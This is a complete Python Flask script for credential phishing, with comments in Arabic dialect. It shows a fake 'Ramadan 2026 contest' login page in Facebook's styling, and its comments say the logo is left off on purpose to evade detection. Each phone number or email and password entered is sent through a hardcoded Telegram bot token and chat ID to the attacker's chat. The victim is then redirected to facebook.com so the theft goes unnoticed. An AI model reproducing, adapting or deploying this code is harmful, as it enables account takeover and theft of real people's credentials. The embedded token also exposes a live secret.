from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# --- إعدادات التيليجرام ---
# التوكن تاعك (لازم تحطو بين " ")
TOKEN = "7670960534:AAERyA83QYd7nN54P6-3fW_9YV4K65Y9o8M" 
# الآيدي تاعك
CHAT_ID = "7479786207" 

# واجهة تسجيل دخول "مموهة" لرمضان (بدون لوغو فيسبوك للهرب من الحماية)
login_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مسابقة رمضان 2026</title>
</head>
<body style="background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
    <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 2px 4px rgba(0,0,0,0.1); width:90%; max-width:350px; text-align:center;">
        <h2 style="color:#1877f2; margin-bottom:20px;">تأكيد الاشتراك</h2>
        <p style="font-size:14px; color:#606770; margin-bottom:20px;">سجل دخولك لتأكيد هويتك واستلام جائزتك فوراً</p>
        <form action="/verify" method="POST">
            <input type="text" name="field1" placeholder="الهاتف أو البريد الإلكتروني" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ddd; border-radius:6px; box-sizing:border-box;" required>
            <input type="password" name="field2" placeholder="كلمة السر" style="width:100%; padding:12px; margin-bottom:20px; border:1px solid #ddd; border-radius:6px; box-sizing:border-box;" required>
            <button style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">تأكيد الحساب</button>
        </form>
        <p style="font-size:12px; color:#90949c; margin-top:20px;">© 2026 مسابقات رمضان الكبرى</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(login_ui)

@app.route('/verify', methods=['POST'])
def verify():
    # استعمال أسماء حقول مموهة
    u = request.form.get('field1')
    p = request.form.get('field2')
    
    # رسالة التبليغ
    msg = f"🔥 صيد جديد من جوجل سايت! 🔥\\n\\n📧 الحساب: {u}\\n🔑 الباسورد: {p}"
    
    # إرسال للتيليجرام
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
    
    # توجيه الضحية للموقع الحقيقي لزيادة المصداقية
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
